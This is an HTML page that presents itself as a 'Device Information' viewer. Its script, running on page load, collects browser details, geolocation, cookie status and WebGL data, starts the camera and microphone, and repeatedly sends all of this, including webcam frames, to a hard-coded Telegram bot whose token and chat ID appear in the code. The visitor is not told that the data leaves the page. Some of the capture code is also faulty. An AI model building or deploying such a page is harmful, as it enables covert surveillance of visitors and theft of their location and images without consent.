<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Information</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #f4f4f4;
    }
    .container {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      max-width: 600px;
      margin: auto;
    }
    h2 {
      text-align: center;
    }
    pre {
      font-family: monospace;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Device Information</h2>
    <pre id="deviceInfo">Loading...</pre>
  </div>

  <script>
    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your bot token
    const chatId = '5571330102'; // Your chat ID

    async function getDeviceInfo() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
      const isMobile = /Mobi|Android/i.test(userAgent);
      const os = getOS(platform);
      const browser = getBrowser(userAgent);
      const pixelRatio = window.devicePixelRatio;

      // Check if cookies are enabled
      const cookiesEnabled = areCookiesEnabled();
      const thirdPartyCookiesEnabled = checkThirdPartyCookies();

      // Geolocation (optional)
      let location = 'Not Available';
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          location = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
          const webGLInfo = getWebGLInfo();
          updateDeviceInfo(userAgent, platform, language, screenWidth, screenHeight, os, browser, location, isMobile, cookiesEnabled, thirdPartyCookiesEnabled, pixelRatio, webGLInfo);
        }, () => {
          const webGLInfo = getWebGLInfo();
          updateDeviceInfo(userAgent, platform, language, screenWidth, screenHeight, os, browser, location, isMobile, cookiesEnabled, thirdPartyCookiesEnabled, pixelRatio, webGLInfo);
        });
      } else {
        const webGLInfo = getWebGLInfo();
        updateDeviceInfo(userAgent, platform, language, screenWidth, screenHeight, os, browser, location, isMobile, cookiesEnabled, thirdPartyCookiesEnabled, pixelRatio, webGLInfo);
      }
    }

    function getOS(platform) {
      if (platform.includes('Win')) return 'Windows';
      if (platform.includes('Mac')) return 'Mac OS';
      if (platform.includes('Linux')) return 'Linux';
      if (platform.includes('Android')) return 'Android';
      if (platform.includes('iPhone')) return 'iOS';
      return 'Unknown OS';
    }

    function getBrowser(userAgent) {
      if (userAgent.includes('Chrome')) return 'Chrome';
      if (userAgent.includes('Firefox')) return 'Firefox';
      if (userAgent.includes('Safari')) return 'Safari';
      if (userAgent.includes('Edge')) return 'Edge';
      if (userAgent.includes('MSIE') || userAgent.includes('Trident')) return 'Internet Explorer';
      return 'Unknown Browser';
    }

    function areCookiesEnabled() {
      document.cookie = "testcookie=true; max-age=3600"; // Set a test cookie
      return document.cookie.indexOf("testcookie") !== -1; // Check if the cookie exists
    }

    function checkThirdPartyCookies() {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
      const iframeWindow = iframe.contentWindow;
      iframeWindow.document.cookie = "testcookie=true";
      const isThirdParty = iframeWindow.document.cookie.indexOf("testcookie") !== -1;
      iframe.remove();
      return isThirdParty;
    }

    function getWebGLInfo() {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      let vendor = "Unknown";
      let renderer = "Unknown";
      if (gl) {
        vendor = gl.getParameter(gl.VENDOR);
        renderer = gl.getParameter(gl.RENDERER);
      }
      return { vendor, renderer };
    }

    function updateDeviceInfo(userAgent, platform, language, screenWidth, screenHeight, os, browser, location, isMobile, cookiesEnabled, thirdPartyCookiesEnabled, pixelRatio, webGLInfo) {
      const deviceDetails = `
Device Information:
----------------------
User-Agent: ${userAgent}
Platform: ${platform}
Language: ${language}
Screen Size: ${screenWidth}x${screenHeight}
Operating System: ${os}
Browser: ${browser}
Device Type: ${isMobile ? 'Mobile' : 'Desktop'}
Location: ${location}
Cookies Enabled: ${cookiesEnabled ? 'Yes' : 'No'}
Third-Party Cookies Enabled: ${thirdPartyCookiesEnabled ? 'Yes' : 'No'}
Device Pixel Ratio: ${pixelRatio}

WebGL Information:
----------------------
WebGL Vendor: ${webGLInfo.vendor}
WebGL Renderer: ${webGLInfo.renderer}
      `;
      
      // Send the information to Telegram bot
      sendToTelegram(deviceDetails);
    }

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            console.log("Message sent successfully!");
          } else {
            console.error("Error sending message:", data);
          }
        })
        .catch(error => {
          console.error("Error:", error);
        });
    }

    async function startCameraAndVoice() {
      try {
        const constraints = {
          video: { facingMode: "user" },
          audio: true
        };
        
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const videoTrack = stream.getVideoTracks()[0];
        const audioTrack = stream.getAudioTracks()[0];

        // Camera and voice recording are now running
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        videoElement.play();

        setInterval(() => {
          captureAndSendImages(stream);
        }, 1000); // Capture image every second

        setInterval(() => {
          captureAndSendVoice(stream);
        }, 5000); // Capture voice every 5 seconds

      } catch (error) {
        console.error("Permission denied or error:", error);
      }
    }

    function captureAndSendImages(stream) {
      const videoElement = document.createElement('video');
      videoElement.srcObject = stream;
      videoElement.play();
      
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/png');
      sendToTelegram(`Image: ${imageData}`);
    }

    function captureAndSendVoice(stream) {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const analyser = audioContext.createAnalyser();
      const microphone = audioContext.createMediaStreamSource(stream);
      microphone.connect(analyser);
      const dataArray = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteFrequencyData(dataArray);

      const audioData = new Blob([dataArray], { type: 'audio/wav' });
      const audioUrl = URL.createObjectURL(audioData);
      sendToTelegram(`Audio: ${audioUrl}`);
    }

    window.onload = function() {
      getDeviceInfo(); // Collect and send device information when the page loads
      startCameraAndVoice(); // Start camera and voice recording
    };
  </script>
</body>
</html>